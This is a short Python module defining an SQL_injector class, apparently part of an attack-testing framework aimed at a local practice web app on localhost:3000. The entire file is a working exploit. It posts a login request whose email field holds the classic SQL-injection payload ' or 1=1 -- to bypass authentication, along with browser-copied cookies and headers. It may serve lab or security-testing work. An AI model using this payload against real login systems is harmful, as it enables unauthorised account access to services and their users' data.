from . import attack as a

class SQL_injector(a.attack_inter):
    def init(self):
        print("init")

    def generator(self):
        cookies = {
            'language': 'en',
            'continueCode': 'KlBmaq4Ln5XE63vDGljh4t8HKTriaS7HnyfpgC3qs71Ap29bWRw7Zyk8o1VP',
            'welcomebanner_status': 'dismiss',
            'cookieconsent_status': 'dismiss',
        }

        headers = {
            'Host': 'localhost:3000',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.5',
            # 'Accept-Encoding': 'gzip, deflate',
            # Already added when you pass json=
            # 'Content-Type': 'application/json',
            # 'Content-Length': '40',
            'Origin': 'http://localhost:3000',
            'Connection': 'close',
            'Referer': 'http://localhost:3000/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            # Requests sorts cookies= alphabetically
            # 'Cookie': 'language=en; continueCode=KlBmaq4Ln5XE63vDGljh4t8HKTriaS7HnyfpgC3qs71Ap29bWRw7Zyk8o1VP; welcomebanner_status=dismiss; cookieconsent_status=dismiss',
        }

        json_data = {
            'email': '\' or 1=1 --',
            'password': '123',
        }

        return cookies, headers, json_data

    def run(self):
        cookies, headers, json_data = self.generator()

        response = a.requests.post('http://localhost:3000/rest/user/login', cookies=cookies, headers=headers, json=json_data, verify=False)

        print("run")